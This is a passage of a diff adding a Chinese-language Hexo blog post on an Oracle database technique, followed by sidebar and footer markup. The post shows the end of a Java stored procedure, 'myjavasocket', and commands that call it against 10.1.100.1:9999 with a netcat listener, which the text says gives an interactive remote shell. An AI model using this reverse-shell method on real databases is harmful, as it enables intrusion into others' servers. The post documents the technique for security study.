+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Os.close(); 
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;socket.close();&amp;nbsp;&amp;nbsp;
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;} 
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;catch(Exception e)
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{ 
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;System.out.println(&quot;Error:&quot;+e); 
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;} 
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;} 
+
+}
+
+create or replace procedure myjavasocket(address in varchar,port in varchar) as language java&amp;nbsp;&amp;nbsp;
+name &apos;javasocket.test(java.lang.String,java.lang.String)&apos;;&amp;nbsp;&amp;nbsp;
+`&lt;/pre&gt;
+
+执行myjavasocket
+&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`exec myjavasocket(&apos;10.1.100.1&apos;,&apos;9999&apos;);
+
+local: nc -l -p 9999
+</code></pre><p>这样就可以得到了一个交互的shell了，不过有些不是exe文件的比如dir就得输入cmd.exe /c dir 来运行….</p>
+<p><small><small>&nbsp;</small></small><div style="color:gray"><span style="font-size: 12px; line-height: 17px;"><br></span></div><small><small>&nbsp;</small></small><div><div><small><small><br></small></small></div></div></p>
+<div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/03/31/a220bc1abe07103310215dc390f96076/" rel="next" title="读《一次SWF XSS挖掘和利用》">
+                <i class="fa fa-chevron-left"></i> 读《一次SWF XSS挖掘和利用》
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2015/04/11/96913359a7d9fe881a0e6c520a7d2ded/" rel="prev" title="读《URL重定向/跳转漏洞》">
+                读《URL重定向/跳转漏洞》 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
